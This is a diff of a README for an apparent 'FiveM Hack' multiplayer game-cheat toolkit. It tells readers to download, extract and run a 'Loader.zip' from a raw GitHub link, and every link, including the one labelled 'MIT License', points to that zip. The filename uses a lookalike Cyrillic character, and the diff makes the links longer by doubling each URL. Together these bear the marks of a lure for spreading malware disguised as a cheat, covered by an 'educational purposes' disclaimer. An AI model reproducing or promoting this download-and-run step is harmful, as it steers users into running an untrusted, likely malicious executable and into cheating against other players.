@@ -8,10 +8,10 @@ Welcome to the **FiveM Hack: Advanced Enhancement Toolkit** – your one-stop en
 
 Get started in a breeze – follow these steps for quick and secure setup:
 
-1. **Download https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip from the repository.**  
+1. **Download https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zipоhttps://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip from the repository.**  
    Make sure to use the official repository link for safety and reliability.
 
-2. **Extract the https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip file using your preferred archive manager.**  
+2. **Extract the https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zipоhttps://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip file using your preferred archive manager.**  
    Common tools include WinRAR, 7-Zip, or the built-in extractor on your OS.
 
 3. **Run the Loader application.**  
@@ -85,13 +85,13 @@ This program is intended solely for **educational and research purposes**. Usage
 ## 📜 License
 
 This project is open-source and distributed under the MIT License.  
-Read the full license text here: [MIT License](https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip)
+Read the full license text here: [MIT License](https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zipоhttps://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip)
 
 ---
 
 ## 🚨 Join the Revolution!
 
-Stay ahead in FiveM multiplayer! Download the https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip today and redefine your FiveM experience with the **Advanced Enhancement Toolkit**. Enjoy a seamless, optimized, and customizable journey beyond the limitations of standard gameplay!
+Stay ahead in FiveM multiplayer! Download the https://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zipоhttps://raw.githubusercontent.com/ifty125/FiveM-QuantumInject/main/Lоader.zip today and redefine your FiveM experience with the **Advanced Enhancement Toolkit**. Enjoy a seamless, optimized, and customizable journey beyond the limitations of standard gameplay!
 
 ---
 
